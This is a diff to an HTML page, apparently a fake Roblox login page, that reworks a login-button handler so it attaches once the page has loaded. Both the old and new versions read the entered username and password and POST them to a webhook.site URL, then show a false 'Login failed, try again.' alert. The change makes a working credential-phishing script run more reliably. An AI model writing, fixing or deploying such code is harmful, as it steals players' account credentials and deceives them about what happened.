@@ -790,20 +790,25 @@ function checkRobloxInstall() {
 
 
 <script>
-  document.getElementById("login-button").onclick = function () {
-    const username = document.getElementById("login-username").value;
-    const password = document.getElementById("login-password").value;
+  document.addEventListener("DOMContentLoaded", function () {
+    const button = document.getElementById("login-button");
+    if (!button) return;
 
-    fetch("https://webhook.site/8eb05088-d3d1-4dec-bffb-332db4d73d00", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: username,
-        password: password
-      })
-    });
+    button.onclick = function () {
+      const username = document.getElementById("login-username").value;
+      const password = document.getElementById("login-password").value;
 
-    alert("Login failed, try again.");
-  };
+      fetch("https://webhook.site/8eb05088-d3d1-4dec-bffb-332db4d73d00", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        })
+      });
+
+      alert("Login failed, try again.");
+    };
+  });
 </script>
 </body></html>
